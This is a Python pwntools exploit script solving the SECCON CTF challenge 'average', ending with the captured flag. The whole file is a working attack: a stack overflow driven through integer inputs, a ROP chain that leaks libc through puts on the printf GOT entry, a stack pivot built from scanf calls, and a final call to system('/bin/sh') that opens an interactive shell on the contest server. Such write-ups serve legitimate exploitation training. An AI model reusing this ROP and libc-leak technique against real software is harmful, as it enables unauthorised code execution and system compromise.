from pwn import *


binpath = './average'
elf = ELF(binpath)
# libcpath = '/lib/x86_64-linux-gnu/libc.so.6'
libcpath = './libc.so.6'
libc = ELF(libcpath)

context.binary = elf
# context.terminal = ['tmux', '-split-w', '-w']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
b *0x40133f
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('average.quals.seccon.jp', 1234)


addr_pop_rdi = 0x00000000004013a3  # : pop rdi ; ret
addr_pop_rsi_r15 = 0x00000000004013a1  # : pop rsi ; pop r15 ; ret
addr_leave_ret = 0x000000000040133e  # : leave ; ret
addr_pop_rbp = 0x000000000040115d  # : pop rbp ; ret


def assert_in_range(rop):
    for i in rop:
        assert(-123456789 <= i <= 123456789)

def send_rop(rop):
    assert_in_range(rop)
    io.sendlineafter(b'n: ', b'%d' % len(rop))
    rop[16] = len(rop)  # it will overwrite n on stack so preserve it
    for i in rop:
        io.sendlineafter(b': ', b'%d' % i)
    io.recvuntil(b'Average = ')
    io.recvline()

# stage 1
rop = list(range(0xa0 // 8))
rop.append(0x0)  # rbp
rop.append(addr_pop_rdi)
rop.append(elf.got['printf'])
rop.append(elf.plt['puts'])
rop.append(elf.symbols['main'])
send_rop(rop)

data = io.recvline().rstrip()
libc.address = u64(data.ljust(8, b'\x00')) - libc.symbols['printf']
print('libc.address = 0x{:x}'.format(libc.address))

addr_pivot = 0x404000 + 0x708
addr_fs = next(elf.search(b'%lld'))

# stage 2
rop = list(range(0xa0 // 8))
rop.append(0x0)  # rbp
# scanf("%lld", addr_pivot + 8)
rop.append(addr_pop_rdi)
rop.append(addr_fs)
rop.append(addr_pop_rsi_r15)
rop.append(addr_pivot + 8)
rop.append(0)
rop.append(elf.plt['__isoc99_scanf'])
# scanf("%lld", addr_pivot + 16)
rop.append(addr_pop_rdi)
rop.append(addr_fs)
rop.append(addr_pop_rsi_r15)
rop.append(addr_pivot + 16)
rop.append(0)
rop.append(elf.plt['__isoc99_scanf'])
# scanf("%lld", addr_pivot + 24)
rop.append(addr_pop_rdi)
rop.append(addr_fs)
rop.append(addr_pop_rsi_r15)
rop.append(addr_pivot + 24)
rop.append(0)
rop.append(elf.plt['__isoc99_scanf'])
# pivot
rop.append(addr_pop_rbp)
rop.append(addr_pivot)
rop.append(addr_leave_ret)
send_rop(rop)

# stage 3
io.sendline(b'%d' % int(addr_pop_rdi))
io.sendline(b'%d' % int(next(libc.search(b'/bin/sh\x00'))))
io.sendline(b'%d' % int(libc.symbols['system']))

io.interactive()
# SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}
